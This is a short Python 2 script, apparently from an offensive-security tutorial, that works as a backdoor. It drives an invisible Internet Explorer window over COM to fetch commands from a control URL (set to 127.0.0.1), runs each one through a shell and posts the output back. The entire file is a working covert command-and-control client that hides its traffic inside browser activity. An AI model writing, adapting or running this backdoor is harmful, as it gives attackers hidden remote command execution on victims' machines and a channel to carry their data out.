from win32com.client import Dispatch
from time import sleep
from subprocess import Popen,PIPE

ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0
dURL = 'http://127.0.0.1'
Flags = 0
TargetFrame = ""

while True:
    ie.Navigate("http://127.0.0.1")
    while ie.ReadyState != 4:
        sleep(1)
    command = ie.Document.body.innerHTML
    command = unicode(command)
    command = command.encode('ascii', 'ignore')
    print '[+] We received command' + command
    
    if 'terminate' in command:
        ie.Quit()
        break
    else:
        CMD = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        Data = CMD.stdout.read()
        PostData = buffer(Data)
        ie.Navigate(dURL, Flags, TargetFrame, PostData)
    sleep(3)
